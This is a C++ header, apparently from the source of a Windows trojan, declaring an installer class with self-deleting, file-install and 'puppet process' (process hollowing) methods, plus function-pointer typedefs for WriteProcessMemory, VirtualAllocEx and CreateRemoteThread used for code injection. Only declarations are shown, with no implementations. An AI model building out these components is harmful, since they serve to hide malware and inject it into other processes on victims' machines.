#pragma once
#include<Windows.h>
#include"../../struct/info.h"
#define SINGLE_INSTACE(c) \
	static c* SingleInstance(BOOL bfree = FALSE)\
{\
	static c* self = NULL;\
	\
	if (bfree)\
{\
	if (self)\
{\
	delete self; self = NULL;\
}\
	\
}\
	else\
{\
	if (self == NULL)\
{\
	self = new c();\
}\
}\
	\
	return self;\
	\
}

class CInstall
{

public:
	SINGLE_INSTACE(CInstall);//致敬前辈WHG，抄自VTCP6
public:
	CInstall();
	virtual ~CInstall();
	static void delMe(MODIFY_DATA modfify_data);		
	static BOOL SaveDeleteFile();				//保存当前执行文件的路径
	static void DeleteMe(MODIFY_DATA modify_data);
	static BOOL MyCreatDirector(LPCSTR lpPath);
	static BOOL InstallFile(MODIFY_DATA modfify_data);
	static BOOL PuppetProcess(TCHAR* pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize);   //傀儡进程启动
};


typedef BOOL (WINAPI *MyWriteProcessMemory)(
	_In_ HANDLE hProcess,
	_In_ LPVOID lpBaseAddress,
	_In_reads_bytes_(nSize) LPCVOID lpBuffer,
	_In_ SIZE_T nSize,
	_Out_opt_ SIZE_T* lpNumberOfBytesWritten
);

typedef LPVOID
(WINAPI*
MyVirtualAllocEx)(
	_In_ HANDLE hProcess,
	_In_opt_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD flAllocationType,
	_In_ DWORD flProtect
);

typedef HANDLE
(WINAPI*
MyCreateRemoteThread)(
	_In_ HANDLE hProcess,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ SIZE_T dwStackSize,
	_In_ LPTHREAD_START_ROUTINE lpStartAddress,
	_In_opt_ LPVOID lpParameter,
	_In_ DWORD dwCreationFlags,
	_Out_opt_ LPDWORD lpThreadId
);
